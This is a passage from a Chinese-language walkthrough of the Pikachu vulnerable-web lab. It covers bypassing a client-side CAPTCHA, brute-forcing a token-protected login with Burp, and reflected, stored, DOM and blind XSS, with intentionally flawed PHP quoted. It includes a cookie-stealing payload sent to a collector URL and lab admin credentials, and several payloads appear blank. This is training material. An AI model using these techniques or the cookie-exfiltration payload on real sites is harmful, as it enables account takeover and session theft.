            alert("请输入验证码!");
            return false;
        } else if (inputCode != code) {
            alert("验证码输入错误!");
            createCode();//刷新验证码
            return false;
        }
        else {
            return true;
        }
    }
    createCode();
```
客户端做验证码验证,服务器端无验证
**漏洞利用**
burp 抓个正确的包,把验证码部分直接去掉就可以继续爆破了
### token防爆破?
**服务器端核心代码**
```php
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password'] && $_POST['token']==$_SESSION['token']){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);
    $line_pre->bind_param('ss',$username,$password);
    if($line_pre->execute()){
        $line_pre->store_result();
        if($line_pre->num_rows>0){
            $html.= ' login success';
        } else{
            $html.= ' username or password is not exists～';
        }
    } else{
        $html.= '执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'';
    }
}
//生成token
set_token();
```
**什么是token**
简单的说 token 是由服务端生成的一串字符串,作为客户端向服务端请求的一个标识.在前端使用用户名/密码向服务端发送请求认证,服务端认证成功,那么在服务端会返回 token 给前端,前端在每次请求时会带上服务端发来的 token 来证明自己的合法性.
**漏洞利用**
burp 抓个正确的包,将以下两个设置为变量
在 Option 中的 Grep Extract 中点击 Add,在点击 Refetch response,找到返回的包,找到来自服务器返回的 token,为了便于查找可以在最下方的输入栏输入 token 直接找到 token 的值
选中 token 的值,复制,同时在选中状态下点击确定,同时在 Option 中的最下方勾选 always,并将线程设置为 1 ,如果不将线程设为1会出现报错
接下来设置 Payloads,对密码的 Payloads 直接导入字典.
对 token 的 Payloads 的参数设置为 Recursive grep,同时在 Payload Options 选中第一项,并将之前复制的 token 值输入到下面的输入栏中.开始爆破.
后面略
---
## XSS
Cross-Site Scripting 简称为"CSS",为避免与前端叠成样式表的缩写"CSS"冲突,故又称 XSS.一般XSS可以分为如下几种常见类型:
1. 反射性XSS;
2. 存储型XSS;
3. DOM型XSS;
XSS 漏洞一直被评估为 web 漏洞中危害较大的漏洞,在 OWASP TOP10 的排名中一直属于前三的江湖地位.
XSS 是一种发生在前端浏览器端的漏洞,所以其危害的对象也是前端用户.
形成 XSS 漏洞的主要原因是程序对输入和输出没有做合适的处理,导致"精心构造"的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害.
因此在 XSS 漏洞的防范上,一般会采用"对输入进行过滤"和"输出进行转义"的方式进行处理:
1. 输入过滤:对输入进行过滤,不允许可能导致 XSS 攻击的字符输入;
2. 输出转义:根据输出点的位置对输出到前端的内容进行适当转义;
**跨站脚本漏洞简单的测试流程**
1. 在目标站点上找到输入点,比如查询接口,留言板等;
2. 输入一组"特殊字符+唯一识别字符",点击提交后,查看返回的源码,是否有做对应的处理;
3. 通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行 js 的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在 XSS 漏洞;
### 反射型xss(get)
**服务器端核心代码**
```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="输入'kobe'试试-_-";
    }else{
        if($_GET['message']=='kobe'){
            $html.="愿你和{$_GET['message']}一样,永远年轻,永远热血沸腾!";
        }else{
            $html.="who is {$_GET['message']},i don't care!";
        }
    }
}
```
**漏洞利用**
按流程来,为了找到输入点,先提交一组特殊字符+唯一识别字符,再去查看源代码
下图说明输入的字符被直接输入到了这个 P 标签中,这里就存在一个输出点
F12 修改前端数量限制,输入 payload `` 点击提交
刷新一次后就不会进行弹窗,说这仅仅是一次性.
### 反射性xss(post)
POST 请求区别与 GET 请求,POST 请求不能从 URL 让用户向服务器提交数据.所以为了进行注入,需要让用户代替攻击者提交 POST 请求,这就需要攻击者自己搭建站点,然后再站点内写一个 POST 表单,将我们搭建出的连接发给用户,这样就能让用户帮攻击者提交 POST 请求发给存在 XSS 漏洞的中.这样就能窃取到用户的 cookie,就能伪造用户登录达到破坏的目的.
**服务器端核心代码**
```php
if(isset($_POST['submit'])){
    if(empty($_POST['message'])){
        $html.="输入'kobe'试试-_-";
    }else{
        //下面直接将前端输入的参数原封不动的输出了,出现xss
        if($_POST['message']=='kobe'){
            $html.="愿你和{$_POST['message']}一样,永远年轻,永远热血沸腾!";
        }else{
            $html.="who is {$_POST['message']},i don't care!";
        }
    }
}
```
**漏洞利用**
和上面 get 型一样,但这里不需要 F12 修改输入限制,输入 payload `` 点击提交
### 存储型xss
**服务器端核心代码**
```php
if(array_key_exists("message",$_POST) && $_POST['message']!=null){
    $message=escape($link, $_POST['message']);
    $query="insert into message(content,time) values('$message',now())";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)!=1){
        $html.="数据库出现异常,提交失败!";
    }
}
if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
    //彩蛋:虽然这是个存储型xss的页面,但这里有个delete的sql注入
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        echo "";
    }else{
        $html.="删除失败,请重试并检查数据库是否还好!";
    }
}
```
**漏洞利用**
同之前的思路,先输入一组特殊字符+唯一识别字符,查看源代码,能发现输出点和反射性 XSS 是相同的.
输入 payload `` 点击提交
再刷新一次,还是会返回设置的 payload 中输入的内容,说明会将插入的内容会被存到数据库中,会造成持续性的攻击.再源代码里也能看到被插入进的 payload.
### DOM型xss
**什么是 DOM**
DOM 全称是 Document Object Model,也就是文档对象模型.我们可以将 DOM 理解为,一个与系统平台和编程语言无关的接口,程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式.当创建好一个页面并加载到浏览器时,DOM 就悄然而生,它会把网页文档转换为一个文档对象,主要功能是处理网页内容.故可以使用 Javascript 语言来操作 DOM 以达到网页的目的.
**什么是 DOM 型 XSS**
首先 DOM 型 XSS 其实是一种特殊类型的反射型 XSS,它是基于 DOM 文档对象模型的一种漏洞.
在网站页面中有许多页面的元素,当页面到达浏览器时浏览器会为页面创建一个顶级的 Document
object 文档对象,接着生成各个子文档对象,每个页面元素对应一个文档对象,每个文档对象包含属性、方法和事件.可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素.也就是说,客户端的脚本程序可以通过 DOM 来动态修改页面内容,从客户端获取 DOM 中的数据并在本地执行.基于这个特性,就可以利用 JS 脚本来实现 XSS 漏洞的利用
**核心代码**
```html
                    function domxss(){
                        var str = document.getElementById("text").value;
                        document.getElementById("dom").innerHTML = "what do you see?";
                    }
                    //试试:'>
                    //试试:' onclick="alert('xss')">,闭合掉就行
                -->
```
**漏洞利用**
输入`test#!12` 测试,F12 查看源代码,找出可注入点是 `what do you see?` ,对 href 构造一个闭合,这样就能实现对 a 标签的一个"控制"的作用.
payload 构造如下 `'> hack the planet`
### DOM型xss-x
**核心代码**
```html
                    function domxss(){
                        var str = window.location.search;
                        var txss = decodeURIComponent(str.split("text=")[1]);
                        var xss = txss.replace(/\+/g,' ');
//                        alert(xss);
                        document.getElementById("dom").innerHTML = "就让往事都随风,都随风吧";
                    }
                    //试试:'>
                    //试试:' onclick="alert('xss')">,闭合掉就行
                -->
```
**漏洞利用**
同之前的步骤,查看源代码,区别第一个 DOM 演示,输入是从 URL 的参数中获取的(类似于反射型),但输出任在 a 标签里,故和之前的方法相同设置 payload
payload 构造如下 `'> hack the planet`
### xss之盲打
**服务器端核心代码**
```php
if(array_key_exists("content",$_POST) && $_POST['content']!=null){
    $content=escape($link, $_POST['content']);
    $name=escape($link, $_POST['name']);
    $time=$time=date('Y-m-d g:i:s');
    $query="insert into xssblind(time,content,name) values('$time','$content','$name')";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        $html.="谢谢参与,阁下的看法我们已经收到!";
    }else {
        $html.="ooo.提交出现异常,请重新提交";
    }
}
```
XSS盲打就是攻击者在不知道后台是否存在 xss 漏洞的情况下,提交恶意 JS 代码在类似留言板等输入框后,所展现的后台位置的情况下,网站采用了攻击者插入的恶意代码,当后台管理员在操作时就会触发插入的恶意代码,从而达到攻击者的目的.
**漏洞利用**
输入 payload `` ,观察到可注入点,以管理员的身份登入后台,就会出现弹窗,这就是一个简单的盲打.通过 xss 钓鱼的方法就能获取到 cookie,就能伪造管理员身份进行登录了.
- 后台: http:///pikachu/vul/xss/xssblind/admin_login.php
- 账号密码: admin 123456
到 pikachu 平台下管理工具,进去初始化平台
盗 cookie payload `document.location = 'http:///pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;`
### xss之过滤
**服务器端核心代码**
```php